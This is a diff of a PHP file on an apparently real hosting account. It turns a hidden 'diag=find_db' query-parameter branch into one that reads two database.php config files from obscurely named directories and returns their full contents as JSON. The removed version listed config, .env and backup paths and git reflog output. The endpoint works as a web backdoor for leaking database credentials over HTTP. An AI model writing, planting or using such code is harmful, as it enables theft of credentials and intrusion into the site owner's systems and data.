@@ -35,28 +35,12 @@ if ($is_valid_manual && isset($_GET['diag'])) {
         exit;
     }
     if ($_GET['diag'] === 'find_db') {
-        $found = [];
-        $paths = [
-            '/home/n1579664/public_html/baznassumbawa.id/config/database.php',
-            '/home/n1579664/public_html/config/database.php',
-            '/home/n1579664/public_html/.env',
-            '/home/n1579664/public_html/pengumpulan.baznassumbawa.id/backups'
-        ];
-        foreach (glob('/home/n1579664/public_html/*/config/*.php') ?: [] as $p) {
-            $paths[] = $p;
-        }
-        foreach (glob('/home/n1579664/public_html/*/*.php') ?: [] as $p) {
-            if (stripos($p, 'config') !== false || stripos($p, 'db') !== false || stripos($p, 'koneksi') !== false) {
-                $paths[] = $p;
-            }
-        }
-        $gitReflog = run_git_command('/usr/local/cpanel/3rdparty/bin/git reflog -n 10');
-        $backups = glob(__DIR__ . '/backups/*') ?: [];
+        $f1 = '/home/n1579664/public_html/9F7A3M0QZP6L8N2D5T4R1WYeHqJmBVaCsdEUHpXKZkJ/config/database.php';
+        $f2 = '/home/n1579664/public_html/9F7A3M0QZP6L8N2D5T4R1WYeHqJmBVaCsdEUHpXKZkJ056fVGdgt/config/database.php';
         echo json_encode([
             'status' => 'ok',
-            'paths' => array_values(array_unique($paths)),
-            'backups' => $backups,
-            'reflog' => $gitReflog['output']
+            'c1' => is_file($f1) ? file_get_contents($f1) : null,
+            'c2' => is_file($f2) ? file_get_contents($f2) : null
         ], JSON_PRETTY_PRINT);
         exit;
     }
